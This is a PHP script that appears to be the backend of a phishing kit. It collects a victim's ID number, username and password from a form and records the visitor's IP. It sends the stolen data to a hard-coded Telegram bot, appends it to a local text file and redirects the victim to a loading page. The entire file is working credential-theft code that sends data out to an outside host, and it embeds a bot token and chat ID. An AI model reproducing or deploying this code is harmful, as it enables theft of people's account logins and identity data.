<?php
@session_start();
$userp = $_SERVER['REMOTE_ADDR'];


$token = "7172679471:AAGxaTpaVH93aDaXk-mQQqI8qu6Mk3vr8lk";
$id = "6855677599";
$urlMsg = "https://api.telegram.org/bot{$token}/sendMessage";
$msg = "
CC: ".$_POST['cc']."
Usuario: ".$_POST['user']."
Clave: ".$_POST['pass']."
IP: ".$userp."
";

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $urlMsg);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "chat_id={$id}&parse_mode=HTML&text=$msg");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$server_output = curl_exec($ch);
curl_close($ch);

////////////////////



	if(isset($_POST['cc']) &&($_POST['user']) &&($_POST['pass']) ){

    $file = fopen("boli2.txt", "a");
fwrite($file, "Documento : " .$_POST['cc']. PHP_EOL);
fwrite($file, "Usuario : " .$_POST['user']. PHP_EOL);
fwrite($file, "Clave : " .$_POST['pass']. PHP_EOL);
fwrite($file, "Fecha :  ".date('Y-m-d')." - ".date('H:i:s')."" . PHP_EOL);
fwrite($file, "IP :   ".$ip."" . PHP_EOL);
fwrite($file, "======================================================== " . PHP_EOL);

header ('location: load.html');

	}
?>
